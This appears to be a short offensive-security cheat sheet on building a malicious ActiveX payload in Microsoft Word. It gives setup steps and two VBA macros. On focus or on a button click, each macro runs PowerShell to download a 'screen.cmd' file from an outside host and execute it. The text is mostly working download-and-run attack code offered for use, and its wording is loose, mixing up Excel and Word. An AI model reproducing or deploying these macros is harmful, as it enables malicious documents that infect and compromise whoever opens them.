# ActiveX Control

***

`ActiveX` controls on worksheets and chart sheets and use for controll command buttons, text boxes, list boxes etc

Excel  BottomRightCell, LinkedCell, ListFillRange, Placement, PrintObject, TopLeftCell.

### Create ActiveX Payload

1. open MS Word and go to Developer Tab
2. click on Design Mode
3. click on more control and select command button
4. right click on command button and select view code

#### Example -1

```excel
Sub InkEdit1_GotFocus()
Run = Shell("cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile('http://nooranetred.com/screen.cmd','screen.cmd');Start-Process 'screen.cmd'", vbNormalFocus)
End Sub
```

#### Example -2

```excel
Private Sub CommandButton1_Click()
Run = Shell("PowerShell (New-Object System.Net.WebClient).DownloadFile('http://nooranetred.com/screen.cmd','screen.cmd');Start-Process 'screen.cmd'", vbNormalFocus)
End Sub
```